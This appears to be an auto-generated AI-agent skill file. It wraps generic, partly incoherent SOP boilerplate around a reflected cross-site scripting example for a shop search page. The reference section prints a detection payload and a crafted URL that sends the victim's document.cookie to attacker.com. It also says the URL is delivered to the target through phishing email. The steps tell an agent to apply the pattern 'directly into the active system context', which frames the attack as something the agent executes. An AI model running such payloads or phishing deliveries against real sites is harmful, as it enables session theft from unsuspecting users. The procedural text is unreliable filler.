---
name: example-2-reflected-xss-via-search-parameter
description: Use when executing example 2 reflected xss via search parameter protocols within the security sector.
---

# Example 2 Reflected Xss Via Search Parameter: Execution Protocol

## ⚙️ Overview
This protocol defines the exact standards for implementing Example 2 Reflected Xss Via Search Parameter. By following this strict operational pattern, the engine guarantees deterministic execution, high performance, and complete adherence to all architectural guardrails established by the system design.

## 🛠️ Implementation SOP
Follow this step-by-step TDD procedure to execute the protocol:

- **Step 1: Baseline Context**: Verify the operational environment. Ensure required tools (like Python, Node, TS, or native CLI) are accessible before injecting new logic.
- **Step 2: Apply the Pattern**: Implement the core example 2 reflected xss via search parameter logic directly into the active system context.
- **Step 3: Enforce Constraints**: Check for syntax errors, injection vulnerabilities, and performance bottlenecks (`O(1)` compliance).
- **Step 4: Execute Test Suite**: Run `npm run test` or the local testing framework to ensure the logic passes all regression checks.
- **Step 5: Document and Commit**: Update the session walkthrough and sync the telemetry logs for the security sector.

---

## 📚 Reference Material

# Example 2: Reflected XSS via Search Parameter

**Scenario**: Search results page reflects query without encoding

**Vulnerable URL**:
```
https://shop.example.com/search?q=test
```

**Detection Test**:
```
https://shop.example.com/search?q=<script>alert(document.domain)</script>
```

**Crafted Attack URL**:
```
https://shop.example.com/search?q=%3Cimg%20src=x%20onerror=%22fetch('https://attacker.com/log?c='+document.cookie)%22%3E
```

**Delivery**: URL sent via phishing email to target user.